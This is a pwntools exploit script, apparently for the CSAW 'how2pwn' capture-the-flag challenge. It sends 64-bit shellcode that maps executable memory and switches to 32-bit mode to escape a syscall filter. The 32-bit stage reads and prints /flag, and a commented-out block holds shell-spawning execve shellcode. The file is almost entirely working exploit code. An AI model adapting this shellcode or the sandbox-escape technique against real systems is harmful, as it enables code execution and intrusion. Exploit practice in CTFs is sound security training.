from pwn import *
import time,sys

exe = ELF("chal3_patched")
exe_rop = ROP(exe)
# libc = ELF("libc6_2.31-0ubuntu9.7_amd64.so")

# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def wait():
    if args.LOCAL and args.R2:
        input("wait")
    else:
        time.sleep(0.2)
def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("how2pwn.chal.csaw.io", 60003)
    return r

io = start()
wait()
io.send(b"8e7bd9e37e38a85551d969e29b77e1ce")


shellcode = f'''
xor rax,rax
mov al, 0x09
mov rdi,0x00080000
mov rsi,0x4000
mov rdx,0x7
mov r10,0x21
xor r8,r8
xor r9,r9
syscall

xor rdi,rdi
mov rsi, 0x00080900
mov rdx,0x500
xor rax,rax
syscall

mov eax, 0x00080900
mov rbx, 0x2300000000
xor rax,rbx
push rax
retf
'''

sc = asm(shellcode,arch="amd64")
print("shellcode length",len(sc))
wait()
io.sendafter(b"shellcode: ",sc)

context.arch='i386'
context.bits=32
flag_path_1 = hex(u32(b"/fla"))
flag_path_2 = hex(u32(b"g\0\0\0"))
shellcode=f'''
mov esp, 0x00080a00
mov eax, 0x5
push {flag_path_2}
push {flag_path_1}
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80

mov ebx,eax
mov eax,0x3
mov ecx,0x00081000
xor edx, edx
mov edx, 0x1020
int 0x80

mov eax, 4
mov ebx, 1
int 0x80
'''

# shellcode = '''
#     mov esp, 0x00080a00
#     push 0x68
#     push 0x732f2f2f
#     push 0x6e69622f
#     mov ebx, esp
#     /* push argument array ['sh\x00'] */
#     /* push 'sh\x00\x00' */
#     push 0x1010101
#     xor dword ptr [esp], 0x1016972
#     xor ecx, ecx
#     push ecx /* null terminate */
#     push 4
#     pop ecx
#     add ecx, esp
#     push ecx /* 'sh\x00' */
#     mov ecx, esp
#     xor edx, edx
#     mov eax, 0xb
#     int 0x80
# '''

sc = asm(shellcode,arch="i386",bits=32)
print("shellcode length",len(sc))
wait()
io.send(sc)
io.interactive()
# 7a01505a0cfefc2f8249cb24e01a2890